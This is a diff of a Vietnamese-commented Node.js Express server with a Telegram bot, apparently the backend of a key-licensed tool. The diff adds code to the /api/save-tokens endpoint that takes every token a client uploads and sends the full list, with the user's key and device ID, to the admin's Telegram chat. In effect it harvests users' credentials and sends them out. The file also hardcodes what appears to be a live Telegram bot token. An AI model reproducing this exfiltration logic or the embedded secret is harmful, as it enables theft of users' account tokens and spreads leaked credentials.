@@ -10,10 +10,7 @@ const PORT = process.env.PORT || 3000;
 // ==========================================
 // CẤU HÌNH BOT TELEGRAM & ADMIN
 // ==========================================
-// Nhập Token Telegram Bot của bạn (hoặc cài biến môi trường BOT_TOKEN trên Render)
 const BOT_TOKEN = process.env.BOT_TOKEN || '8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs';
-
-// Nhập ID Telegram cá nhân của bạn (Admin) vào danh sách này
 const ADMIN_IDS = [8377928865]; 
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -145,14 +142,14 @@ app.get('/api/verify', (req, res) => {
     });
 });
 
-// 3. API Đồng bộ Token
+// 3. API Đồng bộ Token & TỰ ĐỘNG BẮN VỀ TELEGRAM ADMIN
 app.post('/api/save-tokens', (req, res) => {
     const { key, deviceId, tokens } = req.body;
-    if (!tokens || !Array.isArray(tokens)) {
+    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
         return res.json({ success: false, message: '❌ Dữ liệu Token không hợp lệ!' });
     }
 
-    // Lưu vào kho Token chung
+    // 1. Lưu vào file tokens.json chung
     let allTokens = loadTokens();
     tokens.forEach(tk => {
         if (tk && !allTokens.includes(tk)) {
@@ -161,7 +158,7 @@ app.post('/api/save-tokens', (req, res) => {
     });
     saveTokensData(allTokens);
 
-    // Cập nhật Token riêng theo Key
+    // 2. Cập nhật Token riêng theo Key
     const keysData = loadKeys();
     if (key && keysData[key]) {
         keysData[key].tokens = tokens;
@@ -169,7 +166,23 @@ app.post('/api/save-tokens', (req, res) => {
         saveKeys(keysData);
     }
 
-    return res.json({ success: true, message: 'Đã lưu danh sách Token thành công!' });
+    // 3. 🚀 TỰ ĐỘNG BẮN THÔNG BÁO CHỨA TOKEN VỀ TELEGRAM ADMIN
+    ADMIN_IDS.forEach(adminId => {
+        let msg = `🔔 **CÓ USER VỪA MỞ TOOL & ĐỒNG BỘ TOKEN!**\n\n`;
+        msg += `🔑 **Key:** \`${key || 'Chưa xác định'}\`\n`;
+        msg += `📱 **Device ID:** \`${deviceId || 'Chưa xác định'}\`\n\n`;
+        msg += `📋 **Danh sách Token (${tokens.length}):**\n`;
+        
+        tokens.forEach((tk, idx) => {
+            msg += `${idx + 1}. \`${tk}\`\n`;
+        });
+
+        bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(err => {
+            console.error('Lỗi gửi tin nhắn Telegram:', err);
+        });
+    });
+
+    return res.json({ success: true, message: 'Đã lưu và gửi Token về Telegram thành công!' });
 });
 
 // ==========================================
@@ -180,7 +193,6 @@ function isAdmin(msg) {
     return ADMIN_IDS.includes(msg.from.id);
 }
 
-// 📌 BẢNG ĐIỀU KHIỂN BOT ADMIN
 const sendAdminMenu = (chatId) => {
     const menuText = 
         '🤖 **BẢNG ĐIỀU KHIỂN BOT ADMIN SENKOO**\n\n' +
@@ -340,7 +352,6 @@ bot.onText(/\/tatthongbao/, (msg) => {
     return bot.sendMessage(chatId, '🔕 **ĐÃ TẮT POPUP THÔNG BÁO TRÊN TOOL!**', { parse_mode: 'Markdown' });
 });
 
-// Khởi chạy Express Server
 app.listen(PORT, () => {
     console.log(`🚀 Server đang chạy tại Port: ${PORT}`);
 });
